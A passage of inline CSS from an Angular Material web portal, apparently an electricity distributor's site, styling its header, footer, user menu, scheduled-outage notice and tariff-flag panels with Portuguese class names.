    .header-perfil-de-acesso .first-header-row {
        background: linear-gradient(90deg, var(--neo-dark-blue) 0%, var(--neo-dark-green) 100%);
    }

    .header-conjuge .flag-icon,
    .header-perfil-de-acesso .flag-icon {
        color: var(--neo-white) !important;
    }

    .header-imobiliaria .first-header-row,
    .header-corretor .first-header-row,
    .header-padronista .first-header-row {
        background: linear-gradient(90deg, var(--neo-dark-green) 0%, var(--neo-dark-blue) 100%);
    }

    .header-imobiliaria .flag-icon,
    .header-corretor .flag-icon,
    .header-padronista .flag-icon {
        color: var(--neo-white) !important;
    }

    .header-credenciado .first-header-row,
    .header-atendente-credenciado .first-header-row {
        background: linear-gradient(90deg, var(--neo-dark-green) 0%, var(--neo-dark-blue) 100%);
    }

    #tarja-qa {
        display: block;
        position: absolute;
        top: 10px;
        left: 0;
        z-index: 999;
        font-weight: 500;
        font-size: 10px;
        background-color: var(--neo-pure-red);
        color: var(--neo-white);
        padding: 0.3rem;
        border-radius: 0 10px 10px 0;
    }

    #menu-sidenav {
        color: var(--neo-white);
    }

    .flag-button {
        background-color: #FFF;
    }

    #header {
        position: sticky;
        top: 0;
        z-index: 999;
    }

    #header .btn-header-distribuidora {
        display: flex;
        align-items: center;
        justify-content: center;
        width: 179px;
        height: 60px;
        background: var(--neo-dark-green);
        color: var(--neo-white);
        border: none;
    }

    #header .btn-header-distribuidora span {
        font-size: 16px;
        font-weight: 500;
    }

    #header .btn-header-distribuidora .mat-icon {
        margin-bottom: 4px;
    }

    #header .btn-login {
        font-size: 1rem;
        color: var(--neo-white);
    }

    #header li {
        list-style-type: none;
    }

    #header .btn-header {
        font-size: 1rem;
        font-weight: 500;
    }

    #header .transition,
    #header .servico-subconjunto:hover,
    #header .rotate-down,
    #header .rotate-up,
    #header #navbar {
        transition: all 0.7s ease-in-out;
    }

    #header #navbar {
        background-color: var(--neo-white);
    }

    #header .first-header-row {
        transition: background-color 0.5s ease;
        display: flex;
        align-items: center;
        flex-wrap: nowrap;
        height: 4rem;
    }

    #header #nome-usuario {
        color: var(--neo-white);
    }

    #header .second-header-row {
        display: flex;
        background-color: var(--neo-white) !important;
        height: 3.8rem;
    }

    #header .rotate-up {
        transform: rotate(180deg);
    }

    #header .rotate-down {
        transform: rotate(0deg);
    }

    #header .header-logo {
        height: 3rem;
    }

    #header .titulo-subconjunto {
        font-size: 1.25rem;
        margin: 1.5rem 0;
        color: var(--neo-dark-gray);
    }

    #header .opcoes-desktop {
        box-shadow: 0px 2px 4px #00000029;
    }

    #header .opcoes-detalhadas {
        display: flex;
        flex-wrap: wrap;
        height: -moz-fit-content;
        height: fit-content;
        padding-bottom: 1.5rem;
    }

    #header .open-menu {
        height: -moz-fit-content;
        height: fit-content;
        visibility: visible;
        opacity: 1;
        transition: visibility 0.5s, opacity 0.5s ease-out;
        background-color: var(--neo-white);
    }

    #header .close-menu {
        height: 0;
        visibility: hidden;
        opacity: 0;
    }

    #header .servico-subconjunto {
        color: var(--neo-light-green) !important;
        font-weight: 500;
        font-size: 1.1rem;
    }

    #header .servico-subconjunto-mobile {
        font-weight: 500;
        color: var(--neo-dark-green) !important;
        text-decoration: underline;
    }

    #header .servico-subconjunto:hover {
        color: var(--neo-dark-green) !important;
        text-decoration: none;
    }

    #header .mat-drawer-inner-container {
        width: 250px !important;
        height: -moz-fit-content !important;
        height: fit-content !important;
    }

    #header .mat-drawer:not(.mat-drawer-side) {
        height: -moz-fit-content !important;
        height: fit-content !important;
    }

    #header .header-vertical-divider {
        border: 1px solid var(--neo-white);
        opacity: 0.5;
        height: 2rem;
    }

    #header #icone-indicador-perfil {
        color: var(--neo-white);
        font-weight: 300;
        font-size: 0.8125rem;
        letter-spacing: 0.75px;
        line-height: 1rem;
    }

    @media only screen and (max-width: 575px) {
        #header #icone-indicador-perfil {
            font-size: 0.7rem;
        }
    }

    .mat-drawer-content {
        min-height: calc(100vh - 7.8rem) !important;
        height: -moz-fit-content !important;
        height: fit-content !important;
        overflow: unset !important;
    }

    .mat-menu-panel {
        max-width: -moz-fit-content !important;
        max-width: fit-content !important;
    }

    @media only screen and (max-width: 1023px) {
        .mat-drawer-content {
            min-height: calc(100vh - 4rem) !important;
        }
    }

    @media only screen and (max-width: 768px) {
        #tarja-qa {
            display: none;
        }
    }

    @media screen and (max-width: 520px) {
        .bandeira {
            margin: 0.5rem;
        }
    }

    .dot-notificacao {
        height: 6px;
        width: 8px;
        border-radius: 100%;
        position: absolute;
        right: 214px;
        bottom: 94px;
        background-color: red;
    }

    .mat-badge-medium .mat-badge-content {
        width: 13px;
        height: 13px;
        line-height: 17px;
    }

    .mat-badge-medium.mat-badge-overlap.mat-badge-after .mat-badge-content {
        right: -4px;
    }

    .mat-badge-medium.mat-badge-above .mat-badge-content {
        top: 3px;
    }

    .btn-desligamento {
        margin: 5px 15px 10px 0px !important;
    }

    .distribuidora-menu-width {
        width: 179px !important;
        max-width: none !important;
    }

    .rounded-login-arrow-icon {
        width: 40px;
        height: 40px;
        border-radius: 40px;
        background: #00402A;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .btn-login {
        display: flex;
        flex-direction: row;
        align-items: center;
        justify-content: space-around;
        padding-right: 0px;
        border-radius: 40px;
        cursor: pointer;
        background: #007F33;
        -webkit-user-select: none;
        user-select: none;
    }

    .btn-login p {
        margin: 0px;
        margin-right: 10px;
        margin-left: 10px;
    }
    </style>
    <style>
    #footer[_ngcontent-icv-c166] {
        background-color: var(--neo-white);
        position: absolute;
        bottom: 0;
        right: 0;
        width: 100vw;
    }

    #footer[_ngcontent-icv-c166] .link[_ngcontent-icv-c166] a[_ngcontent-icv-c166] {
        margin: 0 1rem;
        margin-left: 1px;
    }

    #footer[_ngcontent-icv-c166] .links-rapidos[_ngcontent-icv-c166] {
        height: 2.8rem;
    }

    #footer[_ngcontent-icv-c166] .links-rapidos[_ngcontent-icv-c166] .texto-footer[_ngcontent-icv-c166] {
        color: var(--neo-white);
    }

    #footer[_ngcontent-icv-c166] .institucional[_ngcontent-icv-c166] {
        padding: 1rem 0;
        color: var(--neo-dark-green);
    }

    #footer[_ngcontent-icv-c166] a[_ngcontent-icv-c166],
    #footer[_ngcontent-icv-c166] a[_ngcontent-icv-c166]:hover {
        transition: ease 0.5ms all;
    }

    #footer[_ngcontent-icv-c166] .footer-copyright[_ngcontent-icv-c166] {
        font-size: 0.7rem;
        font-weight: 400;
    }

    #footer[_ngcontent-icv-c166] .texto-footer[_ngcontent-icv-c166] {
        font-weight: 500;
    }

    #footer[_ngcontent-icv-c166] .texto-endereco[_ngcontent-icv-c166] {
        font-size: 0.938rem;
        display: grid;
        align-items: center;
        font-weight: 400;
        padding: 0 1rem;
    }

    #footer[_ngcontent-icv-c166] #logo-footer[_ngcontent-icv-c166] {
        height: 2.5rem;
    }

    .footer-light[_ngcontent-icv-c166] {
        border-top: 0.313rem solid var(--neo-light-green);
    }

    .footer-light[_ngcontent-icv-c166] .links-rapidos[_ngcontent-icv-c166] {
        background-color: var(--neo-dark-green);
    }

    .footer-dark[_ngcontent-icv-c166] {
        border-top: 0.313rem solid var(--neo-dark-green);
    }

    .footer-dark[_ngcontent-icv-c166] .links-rapidos[_ngcontent-icv-c166] {
        background-color: var(--neo-light-green);
    }

    @media only screen and (max-width: 375px) {
        #footer[_ngcontent-icv-c166] {
            height: var(--heigth-footer-xs);
        }

        #footer[_ngcontent-icv-c166] .institucional[_ngcontent-icv-c166] {
            padding: 2rem 0;
        }
    }

    .assistente-virtual[_ngcontent-icv-c166] {
        display: flex;
        align-items: center;
        justify-content: flex-end;
        position: fixed;
        bottom: 20px;
        right: 20px;
        z-index: 1000;
    }

    .assistente-virtual.scrolled-to-bottom[_ngcontent-icv-c166] {
        bottom: 140px;
    }

    .assistente-virtual[_ngcontent-icv-c166] button[_ngcontent-icv-c166] {
        border: none;
        background-color: transparent;
    }

    .assistente-virtual[_ngcontent-icv-c166] img[_ngcontent-icv-c166] {
        width: 100%;
        height: auto;
        max-width: 180px;
    }
    </style>
    <style>
    .mat-button .mat-button-focus-overlay,
    .mat-icon-button .mat-button-focus-overlay {
        opacity: 0
    }

    .mat-button:hover:not(.mat-button-disabled) .mat-button-focus-overlay,
    .mat-stroked-button:hover:not(.mat-button-disabled) .mat-button-focus-overlay {
        opacity: .04
    }

    @media(hover: none) {

        .mat-button:hover:not(.mat-button-disabled) .mat-button-focus-overlay,
        .mat-stroked-button:hover:not(.mat-button-disabled) .mat-button-focus-overlay {
            opacity: 0
        }
    }

    .mat-button,
    .mat-icon-button,
    .mat-stroked-button,
    .mat-flat-button {
        box-sizing: border-box;
        position: relative;
        -webkit-user-select: none;
        user-select: none;
        cursor: pointer;
        outline: none;
        border: none;
        -webkit-tap-highlight-color: transparent;
        display: inline-block;
        white-space: nowrap;
        text-decoration: none;
        vertical-align: baseline;
        text-align: center;
        margin: 0;
        min-width: 64px;
        line-height: 36px;
        padding: 0 16px;
        border-radius: 4px;
        overflow: visible
    }

    .mat-button::-moz-focus-inner,
    .mat-icon-button::-moz-focus-inner,
    .mat-stroked-button::-moz-focus-inner,
    .mat-flat-button::-moz-focus-inner {
        border: 0
    }

    .mat-button.mat-button-disabled,
    .mat-icon-button.mat-button-disabled,
    .mat-stroked-button.mat-button-disabled,
    .mat-flat-button.mat-button-disabled {
        cursor: default
    }

    .mat-button.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-button.cdk-program-focused .mat-button-focus-overlay,
    .mat-icon-button.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-icon-button.cdk-program-focused .mat-button-focus-overlay,
    .mat-stroked-button.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-stroked-button.cdk-program-focused .mat-button-focus-overlay,
    .mat-flat-button.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-flat-button.cdk-program-focused .mat-button-focus-overlay {
        opacity: .12
    }

    .mat-button::-moz-focus-inner,
    .mat-icon-button::-moz-focus-inner,
    .mat-stroked-button::-moz-focus-inner,
    .mat-flat-button::-moz-focus-inner {
        border: 0
    }

    .mat-raised-button {
        box-sizing: border-box;
        position: relative;
        -webkit-user-select: none;
        user-select: none;
        cursor: pointer;
        outline: none;
        border: none;
        -webkit-tap-highlight-color: transparent;
        display: inline-block;
        white-space: nowrap;
        text-decoration: none;
        vertical-align: baseline;
        text-align: center;
        margin: 0;
        min-width: 64px;
        line-height: 36px;
        padding: 0 16px;
        border-radius: 4px;
        overflow: visible;
        transform: translate3d(0, 0, 0);
        transition: background 400ms cubic-bezier(0.25, 0.8, 0.25, 1), box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1)
    }

    .mat-raised-button::-moz-focus-inner {
        border: 0
    }

    .mat-raised-button.mat-button-disabled {
        cursor: default
    }

    .mat-raised-button.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-raised-button.cdk-program-focused .mat-button-focus-overlay {
        opacity: .12
    }

    .mat-raised-button::-moz-focus-inner {
        border: 0
    }

    ._mat-animation-noopable.mat-raised-button {
        transition: none;
        animation: none
    }

    .mat-stroked-button {
        border: 1px solid currentColor;
        padding: 0 15px;
        line-height: 34px
    }

    .mat-stroked-button .mat-button-ripple.mat-ripple,
    .mat-stroked-button .mat-button-focus-overlay {
        top: -1px;
        left: -1px;
        right: -1px;
        bottom: -1px
    }

    .mat-fab {
        box-sizing: border-box;
        position: relative;
        -webkit-user-select: none;
        user-select: none;
        cursor: pointer;
        outline: none;
        border: none;
        -webkit-tap-highlight-color: transparent;
        display: inline-block;
        white-space: nowrap;
        text-decoration: none;
        vertical-align: baseline;
        text-align: center;
        margin: 0;
        min-width: 64px;
        line-height: 36px;
        padding: 0 16px;
        border-radius: 4px;
        overflow: visible;
        transform: translate3d(0, 0, 0);
        transition: background 400ms cubic-bezier(0.25, 0.8, 0.25, 1), box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
        min-width: 0;
        border-radius: 50%;
        width: 56px;
        height: 56px;
        padding: 0;
        flex-shrink: 0
    }

    .mat-fab::-moz-focus-inner {
        border: 0
    }

    .mat-fab.mat-button-disabled {
        cursor: default
    }

    .mat-fab.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-fab.cdk-program-focused .mat-button-focus-overlay {
        opacity: .12
    }

    .mat-fab::-moz-focus-inner {
        border: 0
    }

    ._mat-animation-noopable.mat-fab {
        transition: none;
        animation: none
    }

    .mat-fab .mat-button-wrapper {
        padding: 16px 0;
        display: inline-block;
        line-height: 24px
    }

    .mat-mini-fab {
        box-sizing: border-box;
        position: relative;
        -webkit-user-select: none;
        user-select: none;
        cursor: pointer;
        outline: none;
        border: none;
        -webkit-tap-highlight-color: transparent;
        display: inline-block;
        white-space: nowrap;
        text-decoration: none;
        vertical-align: baseline;
        text-align: center;
        margin: 0;
        min-width: 64px;
        line-height: 36px;
        padding: 0 16px;
        border-radius: 4px;
        overflow: visible;
        transform: translate3d(0, 0, 0);
        transition: background 400ms cubic-bezier(0.25, 0.8, 0.25, 1), box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
        min-width: 0;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        padding: 0;
        flex-shrink: 0
    }

    .mat-mini-fab::-moz-focus-inner {
        border: 0
    }

    .mat-mini-fab.mat-button-disabled {
        cursor: default
    }

    .mat-mini-fab.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-mini-fab.cdk-program-focused .mat-button-focus-overlay {
        opacity: .12
    }

    .mat-mini-fab::-moz-focus-inner {
        border: 0
    }

    ._mat-animation-noopable.mat-mini-fab {
        transition: none;
        animation: none
    }

    .mat-mini-fab .mat-button-wrapper {
        padding: 8px 0;
        display: inline-block;
        line-height: 24px
    }

    .mat-icon-button {
        padding: 0;
        min-width: 0;
        width: 40px;
        height: 40px;
        flex-shrink: 0;
        line-height: 40px;
        border-radius: 50%
    }

    .mat-icon-button i,
    .mat-icon-button .mat-icon {
        line-height: 24px
    }

    .mat-button-ripple.mat-ripple,
    .mat-button-focus-overlay {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        pointer-events: none;
        border-radius: inherit
    }

    .mat-button-ripple.mat-ripple:not(:empty) {
        transform: translateZ(0)
    }

    .mat-button-focus-overlay {
        opacity: 0;
        transition: opacity 200ms cubic-bezier(0.35, 0, 0.25, 1), background-color 200ms cubic-bezier(0.35, 0, 0.25, 1)
    }

    ._mat-animation-noopable .mat-button-focus-overlay {
        transition: none
    }

    .mat-button-ripple-round {
        border-radius: 50%;
        z-index: 1
    }

    .mat-button .mat-button-wrapper>*,
    .mat-flat-button .mat-button-wrapper>*,
    .mat-stroked-button .mat-button-wrapper>*,
    .mat-raised-button .mat-button-wrapper>*,
    .mat-icon-button .mat-button-wrapper>*,
    .mat-fab .mat-button-wrapper>*,
    .mat-mini-fab .mat-button-wrapper>* {
        vertical-align: middle
    }

    .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button,
    .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button {
        display: inline-flex;
        justify-content: center;
        align-items: center;
        font-size: inherit;
        width: 2.5em;
        height: 2.5em
    }

    .cdk-high-contrast-active .mat-button,
    .cdk-high-contrast-active .mat-flat-button,
    .cdk-high-contrast-active .mat-raised-button,
    .cdk-high-contrast-active .mat-icon-button,
    .cdk-high-contrast-active .mat-fab,
    .cdk-high-contrast-active .mat-mini-fab {
        outline: solid 1px
    }

    .cdk-high-contrast-active .mat-button-base.cdk-keyboard-focused,
    .cdk-high-contrast-active .mat-button-base.cdk-program-focused {
        outline: solid 3px
    }
    </style>
    <style>
    .mat-icon {
        -webkit-user-select: none;
        user-select: none;
        background-repeat: no-repeat;
        display: inline-block;
        fill: currentColor;
        height: 24px;
        width: 24px
    }

    .mat-icon.mat-icon-inline {
        font-size: inherit;
        height: inherit;
        line-height: inherit;
        width: inherit
    }

    [dir=rtl] .mat-icon-rtl-mirror {
        transform: scale(-1, 1)
    }

    .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon,
    .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon {
        display: block
    }

    .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button .mat-icon,
    .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button .mat-icon {
        margin: auto
    }
    </style>
    <style>
    mat-menu {
        display: none
    }

    .mat-menu-panel {
        min-width: 112px;
        max-width: 280px;
        overflow: auto;
        -webkit-overflow-scrolling: touch;
        max-height: calc(100vh - 48px);
        border-radius: 4px;
        outline: 0;
        min-height: 64px
    }

    .mat-menu-panel.ng-animating {
        pointer-events: none
    }

    .cdk-high-contrast-active .mat-menu-panel {
        outline: solid 1px
    }

    .mat-menu-content:not(:empty) {
        padding-top: 8px;
        padding-bottom: 8px
    }

    .mat-menu-item {
        -webkit-user-select: none;
        user-select: none;
        cursor: pointer;
        outline: none;
        border: none;
        -webkit-tap-highlight-color: transparent;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        display: block;
        line-height: 48px;
        height: 48px;
        padding: 0 16px;
        text-align: left;
        text-decoration: none;
        max-width: 100%;
        position: relative
    }

    .mat-menu-item::-moz-focus-inner {
        border: 0
    }

    .mat-menu-item[disabled] {
        cursor: default
    }

    [dir=rtl] .mat-menu-item {
        text-align: right
    }

    .mat-menu-item .mat-icon {
        margin-right: 16px;
        vertical-align: middle
    }

    .mat-menu-item .mat-icon svg {
        vertical-align: top
    }

    [dir=rtl] .mat-menu-item .mat-icon {
        margin-left: 16px;
        margin-right: 0
    }

    .mat-menu-item[disabled]::before {
        display: block;
        position: absolute;
        content: "";
        top: 0;
        left: 0;
        bottom: 0;
        right: 0
    }

    .cdk-high-contrast-active .mat-menu-item {
        margin-top: 1px
    }

    .cdk-high-contrast-active .mat-menu-item.cdk-program-focused,
    .cdk-high-contrast-active .mat-menu-item.cdk-keyboard-focused,
    .cdk-high-contrast-active .mat-menu-item-highlighted {
        outline: dotted 1px
    }

    .mat-menu-item-submenu-trigger {
        padding-right: 32px
    }

    [dir=rtl] .mat-menu-item-submenu-trigger {
        padding-right: 16px;
        padding-left: 32px
    }

    .mat-menu-submenu-icon {
        position: absolute;
        top: 50%;
        right: 16px;
        transform: translateY(-50%);
        width: 5px;
        height: 10px;
        fill: currentColor
    }

    [dir=rtl] .mat-menu-submenu-icon {
        right: auto;
        left: 16px;
        transform: translateY(-50%) scaleX(-1)
    }

    .cdk-high-contrast-active .mat-menu-submenu-icon {
        fill: CanvasText
    }

    button.mat-menu-item {
        width: 100%
    }

    .mat-menu-item .mat-menu-ripple {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        pointer-events: none
    }
    </style>
    <style>
    .mat-drawer-container {
        position: relative;
        z-index: 1;
        box-sizing: border-box;
        -webkit-overflow-scrolling: touch;
        display: block;
        overflow: hidden
    }

    .mat-drawer-container[fullscreen] {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute
    }

    .mat-drawer-container[fullscreen].mat-drawer-container-has-open {
        overflow: hidden
    }

    .mat-drawer-container.mat-drawer-container-explicit-backdrop .mat-drawer-side {
        z-index: 3
    }

    .mat-drawer-container.ng-animate-disabled .mat-drawer-backdrop,
    .mat-drawer-container.ng-animate-disabled .mat-drawer-content,
    .ng-animate-disabled .mat-drawer-container .mat-drawer-backdrop,
    .ng-animate-disabled .mat-drawer-container .mat-drawer-content {
        transition: none
    }

    .mat-drawer-backdrop {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        display: block;
        z-index: 3;
        visibility: hidden
    }

    .mat-drawer-backdrop.mat-drawer-shown {
        visibility: visible
    }

    .mat-drawer-transition .mat-drawer-backdrop {
        transition-duration: 400ms;
        transition-timing-function: cubic-bezier(0.25, 0.8, 0.25, 1);
        transition-property: background-color, visibility
    }

    .cdk-high-contrast-active .mat-drawer-backdrop {
        opacity: .5
    }

    .mat-drawer-content {
        position: relative;
        z-index: 1;
        display: block;
        height: 100%;
        overflow: auto
    }

    .mat-drawer-transition .mat-drawer-content {
        transition-duration: 400ms;
        transition-timing-function: cubic-bezier(0.25, 0.8, 0.25, 1);
        transition-property: transform, margin-left, margin-right
    }

    .mat-drawer {
        position: relative;
        z-index: 4;
        display: block;
        position: absolute;
        top: 0;
        bottom: 0;
        z-index: 3;
        outline: 0;
        box-sizing: border-box;
        overflow-y: auto;
        transform: translate3d(-100%, 0, 0)
    }

    .cdk-high-contrast-active .mat-drawer,
    .cdk-high-contrast-active [dir=rtl] .mat-drawer.mat-drawer-end {
        border-right: solid 1px currentColor
    }

    .cdk-high-contrast-active [dir=rtl] .mat-drawer,
    .cdk-high-contrast-active .mat-drawer.mat-drawer-end {
        border-left: solid 1px currentColor;
        border-right: none
    }

    .mat-drawer.mat-drawer-side {
        z-index: 2
    }

    .mat-drawer.mat-drawer-end {
        right: 0;
        transform: translate3d(100%, 0, 0)
    }

    [dir=rtl] .mat-drawer {
        transform: translate3d(100%, 0, 0)
    }

    [dir=rtl] .mat-drawer.mat-drawer-end {
        left: 0;
        right: auto;
        transform: translate3d(-100%, 0, 0)
    }

    .mat-drawer[style*="visibility: hidden"] {
        display: none
    }

    .mat-drawer-inner-container {
        width: 100%;
        height: 100%;
        overflow: auto;
        -webkit-overflow-scrolling: touch
    }

    .mat-sidenav-fixed {
        position: fixed
    }
    </style>
    <style>
    .mat-expansion-panel {
        box-sizing: content-box;
        display: block;
        margin: 0;
        border-radius: 4px;
        overflow: hidden;
        transition: margin 225ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
        position: relative
    }

    .mat-accordion .mat-expansion-panel:not(.mat-expanded),
    .mat-accordion .mat-expansion-panel:not(.mat-expansion-panel-spacing) {
        border-radius: 0
    }

    .mat-accordion .mat-expansion-panel:first-of-type {
        border-top-right-radius: 4px;
        border-top-left-radius: 4px
    }

    .mat-accordion .mat-expansion-panel:last-of-type {
        border-bottom-right-radius: 4px;
        border-bottom-left-radius: 4px
    }

    .cdk-high-contrast-active .mat-expansion-panel {
        outline: solid 1px
    }

    .mat-expansion-panel.ng-animate-disabled,
    .ng-animate-disabled .mat-expansion-panel,
    .mat-expansion-panel._mat-animation-noopable {
        transition: none
    }

    .mat-expansion-panel-content {
        display: flex;
        flex-direction: column;
        overflow: visible
    }

    .mat-expansion-panel-content[style*="visibility: hidden"] * {
        visibility: hidden !important
    }

    .mat-expansion-panel-body {
        padding: 0 24px 16px
    }

    .mat-expansion-panel-spacing {
        margin: 16px 0
    }

    .mat-accordion>.mat-expansion-panel-spacing:first-child,
    .mat-accordion>*:first-child:not(.mat-expansion-panel) .mat-expansion-panel-spacing {
        margin-top: 0
    }

    .mat-accordion>.mat-expansion-panel-spacing:last-child,
    .mat-accordion>*:last-child:not(.mat-expansion-panel) .mat-expansion-panel-spacing {
        margin-bottom: 0
    }

    .mat-action-row {
        border-top-style: solid;
        border-top-width: 1px;
        display: flex;
        flex-direction: row;
        justify-content: flex-end;
        padding: 16px 8px 16px 24px
    }

    .mat-action-row .mat-button-base,
    .mat-action-row .mat-mdc-button-base {
        margin-left: 8px
    }

    [dir=rtl] .mat-action-row .mat-button-base,
    [dir=rtl] .mat-action-row .mat-mdc-button-base {
        margin-left: 0;
        margin-right: 8px
    }
    </style>
    <style>
    .mat-expansion-panel-header[aria-disabled=true] {
        color: rgba(0, 16, 11, 0.87) !important;
    }

    .infos-usuario {
        padding: 16px;
        width: 451px;
    }

    .infos-usuario .menu__dados-usuario {
        display: flex;
        flex-direction: column;
    }

    .infos-usuario .menu__dados-usuario p {
        padding: 0;
        margin: 0;
        font-size: 22px;
        font-weight: 600;
    }

    .infos-usuario .mat-expansion-panel-header {
        height: 48px;
        max-height: 100%;
    }

    .infos-usuario .mat-expansion-panel-header .menu_perfil-icone {
        height: 20px;
        margin-right: 10px;
    }

    .infos-usuario .mat-expansion-panel {
        background: #F4F4F4;
        box-shadow: none;
    }

    .infos-usuario .mat-expansion-panel:nth-child(1) {
        margin-bottom: 8px;
    }

    .infos-usuario .mat-expansion-panel-content {
        background: var(--neo-white-2);
    }

    .infos-usuario .mat-expansion-panel-content:hover {
        filter: brightness(90%);
    }

    .infos-usuario .mat-expansion-panel-body {
        margin-left: 10px;
        padding: 12px 0 12px;
    }

    .infos-usuario .mat-divider {
        margin-bottom: 16px;
        margin-top: 16px;
    }

    .infos-usuario .menu__cliente {
        display: grid;
        grid-template-columns: 1fr 1fr;
    }

    .infos-usuario .menu__cliente-endereco {
        margin-top: 16px;
    }

    .infos-usuario .menu__cliente-endereco p {
        margin: 0;
    }

    .infos-usuario .menu__cliente-info p {
        font-size: 14px;
        margin: 0;
    }

    .infos-usuario .menu__cliente-info p img {
        margin-right: 6.5px;
    }

    .infos-usuario .menu__cliente-info span {
        font-size: 22px;
        font-weight: 600;
        color: var(--neo-dark-green);
    }

    .infos-usuario .menu__cliente-info .status__ligada {
        color: var(--neo-dark-green);
    }

    .infos-usuario .menu__cliente-info .status__desligada {
        color: var(--neo-yellow);
    }

    .infos-usuario .menu__cliente-info .status__cortada,
    .infos-usuario .menu__cliente-info .status__suspensa {
        color: var(--neo-pure-red);
    }

    .infos-usuario .menu__cliente-info .status__coletiva {
        color: var(--neo-dark-blue);
    }

    .infos-usuario .menu__cliente-info .status__ligando,
    .infos-usuario .menu__cliente-info .status__potencial {
        color: var(--neo-dark-gray);
    }

    .infos-usuario .menu__cliente-options p img {
        margin-right: 8px;
    }

    .infos-usuario .menu__cliente-options p .icon-configuracao {
        margin-left: -2px;
        margin-right: 6px !important;
    }

    .infos-usuario h6 {
        margin: 0;
    }

    .infos-usuario span:last-child {
        margin: 0;
    }

    .infos-usuario a {
        font-size: 16px;
        font-weight: bold;
        color: var(--neo-dark-green);
        text-decoration: none;
        margin: 0.5em 0 0 0;
    }

    .infos-usuario ul,
    .infos-usuario ol {
        list-style: none;
        padding: 0;
        margin: 0;
    }

    .infos-usuario li {
        display: list-item;
        font-size: 16px;
        display: flex;
        align-items: center;
    }

    .infos-usuario li img {
        margin-right: 10px;
    }

    .infos-usuario li:hover {
        filter: brightness(90%);
        cursor: pointer;
    }
    </style>
    <style>
    #desligamento-programado[_ngcontent-icv-c162] {
        padding: 1rem 1.5rem;
        width: 28rem;
        display: flex;
        text-align: left;
        justify-content: flex-start;
        flex-wrap: wrap;
    }

    @media screen and (max-width: 520px) {
        #desligamento-programado[_ngcontent-icv-c162] {
            width: auto;
        }
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-superior[_ngcontent-icv-c162] {
        display: flex;
        justify-content: space-between;
        width: 95%;
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-titulo[_ngcontent-icv-c162] {
        color: #e39104;
        font-weight: 600;
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-container[_ngcontent-icv-c162] {
        display: flex;
        text-align: left;
        justify-content: flex-start;
        align-items: center;
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-container[_ngcontent-icv-c162] .icone[_ngcontent-icv-c162] {
        font-weight: 100;
        font-size: 50px;
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-container[_ngcontent-icv-c162] .cinza-escuro[_ngcontent-icv-c162] {
        color: var(--neo-dark-gray-2);
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-container[_ngcontent-icv-c162] .cinza-claro[_ngcontent-icv-c162] {
        color: var(--neo-white-600);
        font-weight: 500;
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-container[_ngcontent-icv-c162] .vermelho-erro[_ngcontent-icv-c162] {
        color: var(--neo-pure-red);
        font-weight: 600;
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-container[_ngcontent-icv-c162] .preta[_ngcontent-icv-c162] {
        color: var(--neo-bandeira-preta);
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-container[_ngcontent-icv-c162] .vermelha2[_ngcontent-icv-c162] {
        color: var(--neo-bandeira-vermelha2);
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-container[_ngcontent-icv-c162] .vermelha1[_ngcontent-icv-c162] {
        color: var(--neo-bandeira-vermelha1);
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-container[_ngcontent-icv-c162] .amarela[_ngcontent-icv-c162] {
        color: var(--neo-bandeira-amarela);
    }

    #desligamento-programado[_ngcontent-icv-c162] .desligamento-container[_ngcontent-icv-c162] .verde[_ngcontent-icv-c162] {
        color: var(--neo-bandeira-verde);
    }
    </style>
    <style>
    #bandeira-tarifaria[_ngcontent-icv-c163] {
        padding: 1rem 1.5rem;
        width: 28rem;
        display: flex;
        text-align: left;
        justify-content: flex-start;
        flex-wrap: wrap;
    }

    @media screen and (max-width: 520px) {
        #bandeira-tarifaria[_ngcontent-icv-c163] {
            width: auto;
        }
    }

    #bandeira-tarifaria[_ngcontent-icv-c163] .bandeira-superior[_ngcontent-icv-c163] {
        display: flex;
        justify-content: space-between;
        width: 95%;
    }

    #bandeira-tarifaria[_ngcontent-icv-c163] .bandeira-container[_ngcontent-icv-c163] {
        display: flex;
        text-align: left;
        justify-content: flex-start;
        align-items: center;
    }

    #bandeira-tarifaria[_ngcontent-icv-c163] .bandeira-container[_ngcontent-icv-c163] .icone[_ngcontent-icv-c163] {
        font-weight: 100;
        font-size: 50px;
    }

    .cinza-escuro[_ngcontent-icv-c163] {
        color: var(--neo-dark-gray-2);
        font-weight: 600;
    }

    .cinza-claro[_ngcontent-icv-c163] {
        color: var(--neo-white-600);
        font-weight: 500;
    }

